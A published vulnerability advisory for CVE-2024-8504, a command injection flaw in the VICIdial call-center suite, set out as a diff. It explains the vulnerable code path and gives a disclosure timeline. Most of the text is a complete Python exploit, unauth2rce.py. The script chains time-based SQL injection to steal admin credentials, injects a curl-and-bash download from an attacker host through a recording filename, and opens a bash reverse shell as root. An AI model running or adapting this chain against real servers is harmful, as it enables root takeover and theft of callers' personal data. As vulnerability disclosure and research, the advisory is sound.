@@ -1,0 +1,761 @@
+id: 39747
+date: 09/11/2024
+title: VICIdial 2.14-917a Remote Code Execution Vulnerability
+author: Jaggar Henry
+cves: CVE-2024-8504
+
+Title: VICIdial Authenticated Remote Code Execution
+Publication URL: https://korelogic.com/Resources/Advisories/KL-001-2024-012.txt
+
+
+1. Vulnerability Details
+
+      Affected Vendor: VICIdial
+      Affected Product: VICIdial
+      Affected Version: 2.14-917a
+      Platform: GNU/Linux
+      CWE Classification: CWE-78: Improper Neutralization of Special
+                          Elements used in an OS Command
+                          ('OS Command Injection')
+      CVE ID: CVE-2024-8504
+
+
+2. Vulnerability Description
+
+      An attacker with authenticated access to VICIdial as an "agent"
+      can execute arbitrary shell commands as the "root" user. This
+      attack can be chained with CVE-2024-8503 to execute arbitrary
+      shell commands starting from an unauthenticated perspective.
+
+
+3. Technical Description
+
+      VICIdial is an open-source contact center suite, mainly used
+      by call centers. The "vicidial.com" website boasts over 14,000
+      registered installations. There is a public SVN repository to
+      access the source code, as well as an ISO that can be used to
+      install the software. The ISO was used in a virtual machine
+      for testing purposes.
+
+      Users can be added to specific "groups" that enable them to log
+      into the "agent" web client if that group is associated with a
+      "campaign".  This web client is for agents to manage inbound
+      and outbound phone calls, displaying pertinent information
+      regarding the "lead", such as the personal information of the
+      individual on the other end of the call.
+
+      An agent has the ability to record the phone call using the
+      "START RECORDING" button. When clicked, an HTTP request is sent
+      to the server which is processed by the "manager_send.php"
+      PHP script. The "filename" parameter included in the request
+      is sanitized with the "preg_replace" PHP function to prevent
+      SQL injection, as shown by this snippet:
+
+     if (isset($_GET["filename"])) {$filename=$_GET["filename"];}
+     elseif (isset($_POST["filename"])) {$filename=$_POST["filename"];}
+     ...
+     $filename = preg_replace("/\'|\"|\\\\|;/","",$filename);
+
+      The regular expression used to sanitize this parameter is
+      very permissive, only removing single quotes, double quotes,
+      backslashes, and semicolons.
+
+      Later in the execution of "manager_send.php", the "filename"
+      variable is added to a SQL database through an "INSERT"
+      statement, along with other user-controlled variables such as
+      "exten":
+
+     $stmt="INSERT INTO vicidial_manager values('','','$NOW_TIME',
+         'NEW','N','$server_ip','','Originate','$vmgr_callerid',
+         'Channel: $channel','Context: $ext_context',
+         'Exten: $exten','Priority: $ext_priority',
+         'Callerid: $filename','','','','','');";
+     if ($format=='debug') {echo "\n<!-- $stmt -->";}
+     $rslt=mysql_to_mysqli($stmt, $link);
+
+      On the server-side, an asyncronous cron job is executing the
+      perl script "ADMIN_keepalive_ALL.pl":
+
+     vicibox11:/ # crontab -l | grep keepalive
+     ### keepalive script for astguiclient processes
+     * * * * * /usr/share/astguiclient/ADMIN_keepalive_ALL.pl
+
+      This perl script ensures several worker perl scripts
+      are running.  Included in these worker perl scripts is
+      "AST_manager_send.pl", as shown by this snippet from
+      "ADMIN_keepalive_ALL.pl":
+
+     if ($psline[1] =~ /AST_manager_se/)
+       {
+       $runningAST_send++;
+       if ($DB) {print "AST_send RUNNING:   |$psline[1]|\n";}
+       }
+     ...
+     if ( ($AST_send_listen > 0) && ($runningAST_send < 1) )
+       {
+       if ($DB) {print "starting AST_manager_send...\n";}
+       # add a '-L' to the command below to activate logging
+       `/usr/bin/screen -d -m -S ASTsend
+         $PATHhome/AST_manager_send.pl $debug_string`;
+
+      The "AST_manager_send.pl" script will continuously monitor the
+      "vicidial_manager" table in the SQL database for records with
+      the "status" column equal the string "NEW". Values from that
+      row are then URL-encoded and used as command-line arguments
+      to invoke the "AST_send_action_child.pl" perl script:
+
+     while ($endless_loop > 0)
+       {
+       my $stmtA = "SELECT count(*) from
+         vicidial_manager where server_ip = '"
+         . $conf{VARserver_ip} . "' and status = 'NEW';";
+       ...
+       $originate_command .= $vdm->{cmd_line_e} . "\n"
+         if ($vdm->{cmd_line_e});
+       $originate_command .= $vdm->{cmd_line_f} . "\n"
+         if ($vdm->{cmd_line_f});
+       $originate_command .= $vdm->{cmd_line_g} . "\n"
+         if ($vdm->{cmd_line_g});
+       ...
+       $vdm->{cmd_line_e} =~ s/([^A-Za-z0-9])/sprintf("%%%02X", ord($1))/seg;
+       $vdm->{cmd_line_f} =~ s/([^A-Za-z0-9])/sprintf("%%%02X", ord($1))/seg;
+       $vdm->{cmd_line_g} =~ s/([^A-Za-z0-9])/sprintf("%%%02X", ord($1))/seg;
+       ...
+       $launch .= " --cmd_line_e=" . $vdm->{cmd_line_e}
+         if ($vdm->{cmd_line_e});
+       $launch .= " --cmd_line_f=" . $vdm->{cmd_line_f}
+         if ($vdm->{cmd_line_f});
+       $launch .= " --cmd_line_g=" . $vdm->{cmd_line_g}
+         if ($vdm->{cmd_line_g});
+       ...
+       $launch .= " >> " . $conf{PATHlogs} . "/action_send." .  logDate()
+         if ($SYSLOG);
+       system($launch . ' &');
+
+      The "AST_send_action_child.pl" will then initiate a telnet
+      connection to the "Asterisk Call Manager" and issue various
+      commands as they appear in the command-line arguments:
+
+     my $tn = new Net::Telnet (Port => $telnet_port,
+         Prompt => '/\r\n/',
+         Output_record_separator => '',
+         Errmode    => "return");
+     ...
+     $tn->open("$telnet_host");
+     $tn->waitfor('/Asterisk Call Manager\//');
+     ...
+     $originate_command .= $cmd_line_e . "\n" if ($cmd_line_e);
+     $originate_command .= $cmd_line_f . "\n" if ($cmd_line_f);
+     $originate_command .= $cmd_line_g . "\n" if ($cmd_line_g);
+     ...
+     my @list_channels = $tn->cmd(String => $originate_command,
+         Prompt => '/.*/');
+
+      These commands are then processed by the Asterisk
+      Management interface (AMI). The configuration file
+      "extensions-vicidial.conf" contains useful information on
+      how AMI processes the value of the user-controlled "Exten"
+      command. The following is a relevant snippet:
+
+     exten => 8309,1,Answer
+     exten => 8309,2,Monitor(wav,${CALLERID(name)})
+     exten => 8309,3,Wait(3600)
+     exten => 8309,4,Hangup()
+     ...
+
+      When supplying an "Exten" value of "8309", the "Monitor"
+      application is invoked, which will record the current call and
+      write the recorded data into a file. The default directory
+      is "/var/spool/asterisk/monitor". In this case, the name
+      of the file is derived from the "CALLERID", which is also
+      user-controlled.
+
+      This can be leveraged by an attacker to write file names
+      that contain malicious shell commands. Take for example the
+      following HTTP request:
+
+     POST /agc/manager_send.php HTTP/1.1
+     Host: REDACTED
+     Content-Length: 279
+     Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+  server_ip=REDACTED&session_name=1716765726_8300defaul17394646&user=korelogic&pass=korelogic&ACTION=MonitorConf&format=text&channel=Local/58600051@default&filename=3133731337$(id>foobar.txt)&exten=8309&ext_context=default&lead_id=&ext_priority=1&FROMvdc=YES&uniqueid=&FROMapi=
+
+      Two files are created within the "/var/spool/asterisk/monitor"
+      directory:
+
+     vicibox11:/ # ls -l /var/spool/asterisk/monitor
+     total 216
+     -rw-r--r-- 1 root root 213164 May 30 05:30 \
+         3133731337$(id>foobar.txt)-in.wav
+     -rw-r--r-- 1 root root     44 May 30 05:30 \
+         3133731337$(id>foobar.txt)-out.wav
+
+      Additionally, the "AST_CRON_audio_1_move_VDonly.pl" perl script
+      is executed every 3 minutes:
+
+     vicibox11:/ # crontab -l | grep VDonly
+     0,3,6,9,12,15,18,21,24,27,30,33,36,39,42,45,48,51,54,57 * * * * \
+         /usr/share/astguiclient/AST_CRON_audio_1_move_VDonly.pl
+
+      This script searches for WAV/GSM files within the Asterisk
+      monitor directory and uses the file names to execute several
+      shell commands:
+
+     foreach(@FILES)
+       {
+       ...
+       $INfile = $FILES[$i];
+       ...
+       if (!$T)
+         {
+         `mv -f "$dir1/$INfile" "$dir2/$ALLfile"`;
+         `rm -f "$dir1/$OUTfile"`;
+         }
+
+      The malicious file name is then inserted into the "mv"
+      command. The attacker controlled "id" command is executed and
+      the output is redirected to the file "foo.txt":
+
+     vicibox11:/ # ls -l /root/foobar.txt
+     -rw-r--r-- 1 root root 39 May 30 05:33 /root/foobar.txt
+
+
+4. Mitigation and Remediation Recommendation
+
+      This issue has been remediated in the public svn/trunk codebase,
+      as of revision 3848 committed 2024-07-08.
+
+
+5. Credit
+
+      This vulnerability was discovered by Jaggar Henry of KoreLogic,
+      Inc.
+
+
+6. Disclosure Timeline
+
+      2024-07-05 : KoreLogic requests security contact from
+                   support@vicidial.com.
+      2024-07-08 : KoreLogic reports vulnerability details to VICIdial
+                   contact.
+      2024-07-08 : VICIdial notifies KoreLogic that the issue has been
+                   remediated with revision 3848 in the public
+                   Subversion repository.
+      2024-07-11 : KoreLogic confirms this vulnerability has been
+                   remediated. KoreLogic asks VICIdial if it is
+                   appropriate to publicly disclose the vulnerability
+                   details at this time.
+      2024-07-11 : VICIdial requests four weeks of embargo in order to
+                   upgrade supported customers.
+      2024-08-05 : KoreLogic asks VICIdial if it is appropriate to
+                   publicly disclose the vulnerability details at
+                   this time.
+      2024-08-09 : VICIdial requests an additional two weeks of
+                   embargo.
+      2024-09-10 : KoreLogic public disclosure.
+
+
+7. Proof of Concept
+
+      Instead of executing the "id" command, a malicious bash script
+      can be downloaded and executing using the cURL utility. The following
+      file name is an example:
+
+          $(curl$IFS@attacker.com$IFS-o$IFS.c&&bash$IFS.c)
+
+      This issue can be chained with KL-001-2024-011 (unauthenticated SQL injection)
+      to execute arbitrary shell commands as the root user from an unauthenticated
+      perspective:
+
+      [goon@security exploits]$ python unauth2rce.py -rh 192.168.2.136 -rp 443 -wh 192.168.2.65 -wp 3000 -lh 
+192.168.2.65 -lp 1337 --bind
+      [+] Target appears vulnerable to time-based SQL injection
+      [~] Enumerating administrator credentials
+      [~] 6
+      [~] 66
+      [~] 666
+      [~] 6666
+      [+] Username: 6666
+      [~] J
+      [~] JA
+      [~] JAB
+      [~] JAB1
+      [~] JAB18
+      [~] JAB181
+      [~] JAB181M
+      [~] JAB181MA
+      [~] JAB181MAB
+      [~] JAB181MAB1
+      [~] JAB181MAB17
+      [~] JAB181MAB178
+      [~] JAB181MAB178_
+      [~] JAB181MAB178_L
+      [~] JAB181MAB178_LA
+      [~] JAB181MAB178_LAn
+      [+] Password: JAB181MAB178_LAn
+      [+] Authenticated successfully as user "6666"
+      [+] Updated user settings to increase privileges
+      [+] Updated system settings
+      [+] Created dummy campaign "korelogic_campaign"
+      [+] Updated dummy campaign settings
+      [+] Created dummy list for campaign
+      [+] Found phone credentials: callin:test
+      [+] Entered "manager" credentials to override shift enforcement
+      [+] Authenticated as agent using phone credentials
+      [~] Listening for incoming connections...
+      [+] Received cURL request from 192.168.2.136
+      Connection from 192.168.2.136:56980
+      vicibox11:~ # id
+      uid=0(root) gid=0(root) groups=0(root)
+
+      #########################
+      ##    unauth2rce.py    ##
+      #########################
+
+      import os
+      import re
+      import socket
+      import string
+      import random
+      import urllib3
+      import argparse
+      import requests
+      import threading
+      from base64 import b64encode
+      from bs4 import BeautifulSoup
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+      class Exploit:
+          def __init__(self, rhost, rport, whost, wport, lhost=None, lport=None, bind=False, proxy=None):
+              """
+              This 'sleep' duration is derived by the average response time
+              multiplied by this value. A server with an average response time
+              of 10ms is given a 'sleep' duration of 300ms. Tune as needed.
+              """
+              self.SLEEP_MULTIPLIER = 30
+
+              self.REQUEST_HEADERS = {'User-Agent': 'KoreLogic'}
+              self.ALLOWED_SCHEMES = ['http', 'https']
+              if proxy:
+                  self.REQUEST_PROXIES = {
+                      'http':  proxy,
+                      'https': proxy
+                  }
+              else:
+                  self.REQUEST_PROXIES = {}
+
+              self.TARGET_IP   = rhost
+              self.TARGET_PORT = rport
+
+              self.PAYLOAD_WEBSERVER_HOST = whost
+              self.PAYLOAD_WEBSERVER_PORT = wport
+
+              self.REVERSE_SHELL_HOST = lhost
+              self.REVERSE_SHELL_PORT = lport
+
+              self.BIND = bind
+
+              self.VICIDIAL_FINGERPRINT = 'Please Hold while I redirect you!'
+              self.RANDOM_CHARSET = string.ascii_uppercase + string.digits
+
+          # returns a URI with 'http' or 'https'
+          def determine_target_uri(self):
+              for scheme in self.ALLOWED_SCHEMES:
+                  target_uri = f'{scheme}://{self.TARGET_IP}:{self.TARGET_PORT}'
+                  try:
+                      response = requests.get(target_uri, headers=self.REQUEST_HEADERS, verify=False)
+                      if self.VICIDIAL_FINGERPRINT in response.text:
+                          return target_uri
+                  except:
+                      pass
+
+          # returns a session object with custom proxies/headers if supplied
+          def build_requests_session(self):
+              self.base_uri = self.determine_target_uri()
+              session = requests.Session()
+              session.proxies = self.REQUEST_PROXIES
+              session.verify  = False
+              return session
+
+          # returns a random string of a given length
+          def random(self, length):
+              return ''.join(random.choice(self.RANDOM_CHARSET) for _ in range(length))
+
+          # returns a timedelta representing the response time of an injected SQL query
+          def time_sql_query(self, query, session):
+              username    = f"goolicker', '', ({query}));# "
+              credentials = f'{username}:password'
+              credentials_base64 = b64encode(credentials.encode()).decode()
+              auth_header = f'Basic {credentials_base64}'
+
+              target_uri = f'{self.base_uri}/VERM/VERM_AJAX_functions.php'
+              request_params  = {'function': 'log_custom_report', self.random(5): self.random(5)}
+              request_headers = {**self.REQUEST_HEADERS, 'Authorization': auth_header}
+
+              response = session.get(target_uri, params=request_params, headers=request_headers)
+              return response.elapsed
+
+          # returns a boolean if time-based SQL injection is possible, additionally
+          # sets the best 'sleep' duration based on response times
+          def is_vulnerable(self, session, baseline_iterations=5):
+              # determine average baseline response time
+              zero_sleep_query = f'SELECT (NULL)'
+              total_baseline_time = 0
+              for _ in range(baseline_iterations):
+                  execution_time = self.time_sql_query(zero_sleep_query, session)
+                  total_baseline_time += execution_time.total_seconds()
+
+              average_baseline_response_time = total_baseline_time / baseline_iterations
+              self.sql_baseline_time = average_baseline_response_time
+
+              # determine if injected sleep query impacts response time
+              sleep_length = round(average_baseline_response_time * self.SLEEP_MULTIPLIER, 2)
+              sleep_query  = f'SELECT (sleep({sleep_length}))'
+              execution_time = self.time_sql_query(sleep_query, session)
+              if execution_time.total_seconds() >= sleep_length:
+                  self.sql_sleep_length = sleep_length
+                  return True
+              else:
+                  return False
+
+          # determine if a character at a specific indice of a query result returns a
+          # boolean 'true' when compared to a given character using the supplied operator
+          def check_indice_of_query_result(self, session, query, indice, operator, ordinal):
+              parent_query    = f'SELECT IF(ORD((SUBSTRING(({query}), {indice}, {indice}))){operator}{ordinal}, 
+sleep({self.sql_sleep_length}), null)'
+              execution_time  = self.time_sql_query(parent_query, session)
+              return execution_time.total_seconds() >= (self.sql_baseline_time * self.SLEEP_MULTIPLIER)
+
+          def enumerate_sql_query(self, session, query='SELECT @@version', charset=string.printable):
+              # convert charset to ordinals
+              all_characters     = sorted([ord(char) for char in charset])
+              reduced_characters = all_characters
+
+              # use a binary search and enumerate query results
+              result = ''
+              indice = 1
+              indice_could_be_null = True
+              while True:
+                  """
+                  we check if the value is NULL once per indice
+                  to determine when a string ends. this adds one
+                  request per indice, but since every boolean 'true'
+                  results in a delay this is faster than counting
+                  the length of the string before enumrating.
+                  """
+                  if indice_could_be_null:
+                      if self.check_indice_of_query_result(session, query, indice, '=', '0'):
+                          break
+                      else:
+                          indice_could_be_null = False
+
+                  # enumerate each character of query result with a binary search
+                  middle_indice  = len(reduced_characters) // 2
+                  middle_ordinal = reduced_characters[middle_indice]
+                  if self.check_indice_of_query_result(session, query, indice, '<=', middle_ordinal):
+                      if self.check_indice_of_query_result(session, query, indice, '=', middle_ordinal):
+                          reduced_characters = all_characters
+                          result += chr(middle_ordinal)
+                          indice += 1
+                          indice_could_be_null = True
+                          print(f'[~] {result}')
+                      else:
+                          reduced_characters = reduced_characters[:middle_indice]
+                  else:
+                      reduced_characters = reduced_characters[middle_indice:]
+
+              return result
+
+          def poison_recording_files(self, session, username, password):
+              # authenticate using administrator credentials
+              credentials = f'{username}:{password}'
+              credentials_base64 = b64encode(credentials.encode()).decode()
+              auth_header = f'Basic {credentials_base64}'
+
+              target_uri = f'{self.base_uri}/vicidial/admin.php'
+              request_params  = {'ADD': '3', 'user': username}
+              request_headers = {**self.REQUEST_HEADERS, 'Authorization': auth_header}
+
+              response = session.get(target_uri, params=request_params, headers=request_headers)
+              if response.status_code == 200:
+                  print(f'[+] Authenticated successfully as user "{username}"')
+              else:
+                  print('[-] Failed to authenticate with credentials. Maybe hashing is enabled?')
+                  return
+
+              # update user settings to increase privileges beyond default administrator
+              user_settings_body = {
+  "ADD":"4A","custom_fields_modify":"0","user":username,"DB":"0","pass":password,
+  "force_change_password":"N","full_name":"KoreLogic","user_level":"9",
+  "user_group":"ADMIN","phone_login":"KoreLogic","phone_pass":"KoreLogic",
+  "active":"Y","voicemail_id":"","email":"","mobile_number":"","user_code":"",
+  "user_location":"","user_group_two":"","territory":"","user_nickname":"",
+  "user_new_lead_limit":"-1","agent_choose_ingroups":"1","agent_choose_blended":"1",
+  "hotkeys_active":"0","scheduled_callbacks":"1","agentonly_callbacks":"0",
+  "next_dial_my_callbacks":"NOT_ACTIVE","agentcall_manual":"0","manual_dial_filter":"DISABLED",
+  "agentcall_email":"0","agentcall_chat":"0","vicidial_recording":"1","vicidial_transfers":"1",
+  "closer_default_blended":"0","user_choose_language":"0","selected_language":"default+English",
+  "vicidial_recording_override":"DISABLED","mute_recordings":"DISABLED",
+  "alter_custdata_override":"NOT_ACTIVE","alter_custphone_override":"NOT_ACTIVE",
+  "agent_shift_enforcement_override":"ALL","agent_call_log_view_override":"Y",
+  "hide_call_log_info":"Y","agent_lead_search":"NOT_ACTIVE","lead_filter_id":"NONE",
+  "user_hide_realtime":"0","allow_alerts":"0","preset_contact_search":"NOT_ACTIVE",
+  "max_inbound_calls":"0","max_inbound_filter_enabled":"0","max_inbound_filter_min_sec":"-1",
+  "inbound_credits":"-1","max_hopper_calls":"0","max_hopper_calls_hour":"0",
+  "wrapup_seconds_override":"-1","ready_max_logout":"-1","status_group_id":"",
+  "campaign_js_rank_select":"","campaign_js_grade_select":"","ingroup_js_rank_select":"",
+  "ingroup_js_grade_select":"","RANK_AGENTDIRECT":"0","GRADE_AGENTDIRECT":"10",
+  "LIMIT_AGENTDIRECT":"-1","WEB_AGENTDIRECT":"","RANK_AGENTDIRECT_CHAT":"0",
+  "GRADE_AGENTDIRECT_CHAT":"10","LIMIT_AGENTDIRECT_CHAT":"-1","WEB_AGENTDIRECT_CHAT":"",
+  "custom_one":"","custom_two":"","custom_three":"","custom_four":"","custom_five":"",
+  "qc_enabled":"0","qc_user_level":"1","qc_pass":"0","qc_finish":"0","qc_commit":"0",
+  "hci_enabled":"0","realtime_block_user_info":"0","admin_hide_lead_data":"0",
+  "admin_hide_phone_data":"0","ignore_group_on_search":"0","user_admin_redirect_url":"",
+  "view_reports":"1","access_recordings":"0","alter_agent_interface_options":"1",
+  "modify_users":"1","change_agent_campaign":"1","delete_users":"1","modify_usergroups":"1",
+  "delete_user_groups":"1","modify_lists":"1","delete_lists":"1","load_leads":"1",
+  "modify_leads":"1","export_gdpr_leads":"0","download_lists":"1","export_reports":"1",
+  "delete_from_dnc":"1","modify_campaigns":"1","campaign_detail":"1","modify_dial_prefix":"1",
+  "delete_campaigns":"1","modify_ingroups":"1","delete_ingroups":"1","modify_inbound_dids":"1",
+  "delete_inbound_dids":"1","modify_custom_dialplans":"1","modify_remoteagents":"1",
+  "delete_remote_agents":"1","modify_scripts":"1","delete_scripts":"1","modify_filters":"1",
+  "delete_filters":"1","ast_admin_access":"1","ast_delete_phones":"1","modify_call_times":"1",
+  "delete_call_times":"1","modify_servers":"1","modify_shifts":"1","modify_phones":"1",
+  "modify_carriers":"1","modify_email_accounts":"0","modify_labels":"1","modify_colors":"1",
+  "modify_languages":"0","modify_statuses":"1","modify_voicemail":"1","modify_audiostore":"1",
+  "modify_moh":"1","modify_tts":"1","modify_contacts":"1","callcard_admin":"1",
+  "modify_auto_reports":"0","add_timeclock_log":"1","modify_timeclock_log":"1",
+  "delete_timeclock_log":"1","manager_shift_enforcement_override":"1","pause_code_approval":"1",
+  "admin_cf_show_hidden":"0","modify_ip_lists":"0","ignore_ip_list":"0",
+  "two_factor_override":"NOT_ACTIVE","vdc_agent_api_access":"1","api_list_restrict":"0",
+  "api_allowed_functions%5B%5D":"ALL_FUNCTIONS","api_only_user":"0","modify_same_user_level":"1",
+  "download_invalid_files":"1","alter_admin_interface_options":"1","SUBMIT":"SUBMIT"
+              }
+              response = session.post(target_uri, headers=request_headers, data=user_settings_body)
+              print('[+] Updated user settings to increase privileges')
+
+              # update system settings without clobbering existing configuration
+              response = session.get(target_uri, headers=request_headers, params={'ADD':'311111111111111'})
+              soup = BeautifulSoup(response.text, 'html.parser')
+              form_tag = soup.find('form')
+              system_settings_body = {}
+              for input_tag in form_tag.find_all('input'):
+                  setting_name  = input_tag['name']
+                  setting_value = input_tag['value']
+                  system_settings_body[setting_name] = setting_value
+
+              for select_tag in form_tag.find_all('select'):
+                  setting_name = select_tag['name']
+                  selected_tag = select_tag.find('option', selected=True)
+                  if not selected_tag:
+                      continue
+                  setting_value = selected_tag.text
+                  system_settings_body[setting_name] = setting_value
+
+              system_settings_body['outbound_autodial_active'] = '0'
+              response = session.post(target_uri, headers=request_headers, data=system_settings_body)
+              print('[+] Updated system settings')
+
+              # create dummy campaign
+              campaign_settings_body = {
+  "ADD":"21","park_ext":"","campaign_id":"313373","campaign_name":"korelogic_campaign",
+  "campaign_description":"","user_group":"---ALL---","active":"Y","park_file_name":"",
+  "web_form_address":"","allow_closers":"Y","hopper_level":"1","auto_dial_level":"0",
+  "next_agent_call":"random","local_call_time":"12pm-5pm","voicemail_ext":"","script_id":"",
+                  "get_call_launch":"NONE","SUBMIT":"SUBMIT"
+              }
+              response = session.post(target_uri, headers=request_headers, data=campaign_settings_body)
+              print('[+] Created dummy campaign "korelogic_campaign"')
+
+              # update dummy campaign
+              update_campaign_body = {
+  "ADD":"41","campaign_id":"313373","old_campaign_allow_inbound":"Y",
+  "campaign_name":"korelogic_campaign","active":"Y","dial_status":"","lead_order":"DOWN",
+  "list_order_mix":"DISABLED","lead_filter_id":"NONE", "no_hopper_leads_logins":"Y",
+  "hopper_level":"1","reset_hopper":"N","dial_method":"RATIO","auto_dial_level":"1",
+  "adaptive_intensity":"0","SUBMIT":"SUBMIT","form_end":"END"
+              }
+              response = session.post(target_uri, headers=request_headers, data=update_campaign_body)
+              print('[+] Updated dummy campaign settings')
+
+              # create dummy list
+              list_settings_body = {
+  "ADD":"211","list_id":"313374","list_name":"korelogic_list","list_description":"",
+  "campaign_id":"313373","active":"Y","SUBMIT":"SUBMIT"
+              }
+              response = session.post(target_uri, headers=request_headers, data=list_settings_body)
+              print('[+] Created dummy list for campaign')
+
+              # fetch credentials for a phone login
+              response = session.get(target_uri, headers=request_headers, params={'ADD':'10000000000'})
+              soup = BeautifulSoup(response.text, 'html.parser')
+              phone_uri_path = soup.find('a', string='MODIFY')['href']
+
+              response = session.get(f'{self.base_uri}{phone_uri_path}', headers=request_headers)
+              soup = BeautifulSoup(response.text, 'html.parser')
+              phone_extension     = soup.find('input', {'name': 'extension'})['value']
+              phone_password      = soup.find('input', {'name': 'pass'})['value']
+              recording_extension = soup.find('input', {'name': 'recording_exten'})['value']
+              print(f'[+] Found phone credentials: {phone_extension}:{phone_password}')
+
+              # authenticate to agent portal with phone credentials
+              manager_login_body = {
+  "DB":"0","JS_browser_height":"1313","JS_browser_width":"2560","phone_login":phone_extension,
+  "phone_pass":phone_password,"LOGINvarONE":"","LOGINvarTWO":"","LOGINvarTHREE":"","LOGINvarFOUR":"",
+  "LOGINvarFIVE":"","hide_relogin_fields":"","VD_login":username,"VD_pass":password,
+  "MGR_override":"1","relogin":"YES","VD_login":username,"VD_pass":password,
+  "MGR_login20240530":username,"MGR_pass20240530":password,"SUBMIT":"SUBMIT"
+              }
+              response = session.post(f'{self.base_uri}/agc/vicidial.php', headers=request_headers, data=manager_login_body)
+              print(f'[+] Entered "manager" credentials to override shift enforcement')
+
+              agent_login_body = {
+  "DB":"0","JS_browser_height":"1313","JS_browser_width":"2560","admin_test":"","LOGINvarONE":"",
+  "LOGINvarTWO":"","LOGINvarTHREE":"","LOGINvarFOUR":"","LOGINvarFIVE":"","phone_login":phone_extension,
+  "phone_pass":phone_password,"VD_login":username,"VD_pass":password,"VD_campaign":"313373",
+              }
+              response = session.post(f'{self.base_uri}/agc/vicidial.php', headers=request_headers, data=agent_login_body)
+              print(f'[+] Authenticated as agent using phone credentials')
+
+              # insert malicious recording
+              session_name = re.findall(r"var session_name = '([a-zA-Z0-9_]+?)';", response.text)[0]
+              session_id   = re.findall(r"var session_id = '([0-9]+?)';", response.text)[0]
+              malicious_filename = 
+f"3133731337$(curl$IFS@{self.PAYLOAD_WEBSERVER_HOST}:{self.PAYLOAD_WEBSERVER_PORT}$IFS-o$IFS.c&&bash$IFS.c)"
+              record1_body = {
+  "server_ip":self.TARGET_IP,"session_name":session_name,"user":username,"pass":password,
+  "ACTION":"MonitorConf","format":"text","channel":f"Local/{recording_extension}@default","filename":malicious_filename,
+  "exten":recording_extension,"ext_context":"default","lead_id":"","ext_priority":"1","FROMvdc":"YES",
+                  "uniqueid":"","FROMapi":""
+              }
+              response = session.post(f'{self.base_uri}/agc/manager_send.php', headers=request_headers, data=record1_body)
+              recording_id = re.findall(r'RecorDing_ID: ([0-9]+)', response.text)[0]
+
+              # stop malicious recording to prevent file size from growing
+              record2_body = {
+  "server_ip":self.TARGET_IP,"session_name":session_name,"user":username,
+  "pass":password,"ACTION":"StopMonitorConf","format":"text","channel":f"Local/{recording_extension}@default",
+  "filename":f"ID:{recording_id}","exten":session_id,"ext_context":"default","lead_id":"","ext_priority":"1",
+                  "FROMvdc":"YES","uniqueid":"","FROMapi":""
+              }
+              response = session.post(f'{self.base_uri}/agc/conf_exten_check.php', headers=request_headers, 
+data=record2_body)
+
+          # returns administrator username and password by
+          # exploiting time-based SQL injection.
+          def extract_admin_credentials(self, session):
+              print('[~] Enumerating administrator credentials')
+              username_charset = string.ascii_letters + string.digits
+              admin_username_query = "SELECT user FROM vicidial_users WHERE user_level = 9 AND modify_same_user_level = 
+'1' LIMIT 1"
+              admin_username = self.enumerate_sql_query(session, admin_username_query, username_charset)
+              print(f'[+] Username: {admin_username}')
+
+              password_charset = string.ascii_letters + string.digits + '-.+/=_'
+              admin_password_query = f"SELECT pass FROM vicidial_users WHERE user = '{admin_username}' LIMIT 1"
+              admin_password = self.enumerate_sql_query(session, admin_password_query, password_charset)
+              print(f'[+] Password: {admin_password}')
+
+              return admin_username, admin_password
+
+          # emulates a webserver to deliver exploit script
+          def payload_webserver(self):
+              server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+              server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+              server.bind((self.PAYLOAD_WEBSERVER_HOST, int(self.PAYLOAD_WEBSERVER_PORT)))
+              server.listen(1)
+
+              while True:
+                  client, incoming_address = server.accept()
+                  message = client.recv(100)
+                  if b'User-Agent: curl' in message:
+                      break
+                  else:
+                      client.close()
+
+              print(f'[+] Received cURL request from {incoming_address[0]}')
+              exploit_script = f"#!/bin/bash\nbash -i >& /dev/tcp/{self.REVERSE_SHELL_HOST}/{self.REVERSE_SHELL_PORT} 0>&1"
+              http_response  = f"HTTP/1.1 200 OK\r\n"
+              http_response += f"Content-Length: {len(exploit_script)}\r\n\r\n"
+              http_response += exploit_script
+              client.sendall(http_response.encode())
+              client.close()
+
+          # starts a netcat process to catch the incoming reverse shell
+          def netcat_listener(self):
+              os.system(f'nc -nlvs {self.REVERSE_SHELL_HOST} -p {self.REVERSE_SHELL_PORT}')
+
+          # binds to provided addresses and handles incoming connections
+          def prepare_listeners(self):
+              webserver = threading.Thread(target=self.payload_webserver)
+              netcat    = threading.Thread(target=self.netcat_listener)
+              print('[~] Listening for incoming connections...')
+              netcat.start()
+              webserver.start()
+
+
+          # establish a reverse shell as root from the vicidial instance
+          def shell(self):
+              session = self.build_requests_session()
+              is_vulnerable = self.is_vulnerable(session)
+              if is_vulnerable:
+                  print('[+] Target appears vulnerable to time-based SQL injection')
+              else:
+                  print('[-] Failed to perform time-based SQL injection')
+                  return
+
+              username, password = self.extract_admin_credentials(session)
+              self.poison_recording_files(session, username, password)
+
+              # prepare exploit listeners if configured
+              if self.BIND: self.prepare_listeners()
+
+      if __name__ == '__main__':
+          argparser = argparse.ArgumentParser(description='Exploit for CVE-2024-XXXXX: Unauthenticated SQLi to RCE as root')
+          required  = argparser.add_argument_group('Required Arguments')
+          optional  = argparser.add_argument_group('Optional Arguments')
+          required.add_argument('-rh', '--rhost', required=True, help='Vicidial Server IP address')
+          required.add_argument('-rp', '--rport', required=True, help='Vicidial Server port number')
+          required.add_argument('-wh', '--whost', required=True, help='Malicious webserver IP address')
+          required.add_argument('-wp', '--wport', required=True, help='Malicious webserver port number')
+          required.add_argument('-lh', '--lhost', required=False, help='Reverse shell listener IP address')
+          required.add_argument('-lp', '--lport', required=False, help='Reverse shell listener port number')
+          optional.add_argument('-b',  '--bind',  required=False, help='Bind to [lhost:lport] and [whost:wport] and 
+handle connections automatically', action='store_true', default=False)
+          optional.add_argument('-p',  '--proxy', required=False, help='HTTP[S] proxy to use for outbound requests', 
+default=None)
+          arguments = argparser.parse_args()
+
+          exploit = Exploit(
+              rhost = arguments.rhost,
+              rport = arguments.rport,
+              whost = arguments.whost,
+              wport = arguments.wport,
+              lhost = arguments.lhost,
+              lport = arguments.lport,
+              bind  = arguments.bind,
+              proxy = arguments.proxy
+          )
+          exploit.shell()
+
+
+The contents of this advisory are copyright(c) 2024
+KoreLogic, Inc. and are licensed under a Creative Commons
+Attribution Share-Alike 4.0 (United States) License:
+http://creativecommons.org/licenses/by-sa/4.0/
+
+KoreLogic, Inc. is a founder-owned and operated company with a
+proven track record of providing security services to entities
+ranging from Fortune 500 to small and mid-sized companies. We
+are a highly skilled team of senior security consultants doing
